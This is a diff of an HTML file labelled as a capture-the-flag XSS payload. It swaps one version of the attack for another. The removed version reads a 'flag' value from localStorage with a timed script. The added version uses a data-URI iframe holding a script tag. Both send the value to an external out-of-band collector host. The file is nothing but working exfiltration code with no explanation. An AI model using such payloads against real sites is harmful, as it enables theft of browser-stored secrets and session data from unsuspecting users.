@@ -1,17 +1,13 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <title>CTF Payload - Meta Refresh</title>
-  <script>
-    setTimeout(() => {
-      const flag = localStorage.getItem('flag') || '';
-      window.location = 'https://bhvsumorecywkcaevmkui8q6n12uvuhmu.oast.fun/?flag=' + encodeURIComponent(flag);
-    }, 1000); // wait 1 second before redirect
-  </script>
+<html>
+  <head>
+    <title>XSS Payload</title>
+  </head>
+  <body>
+    <h1>Loading...</h1>
 
-</head>
-<body>
-  <h1>Redirecting...</h1>
-</body>
+    <iframe src="data:text/html,&lt;script&gt;location='https://bhvsumorecywkcaevmkui8q6n12uvuhmu.oast.fun/?flag='+localStorage.getItem('flag')&lt;/script&gt;">
+    </iframe>
+
+  </body>
 </html>
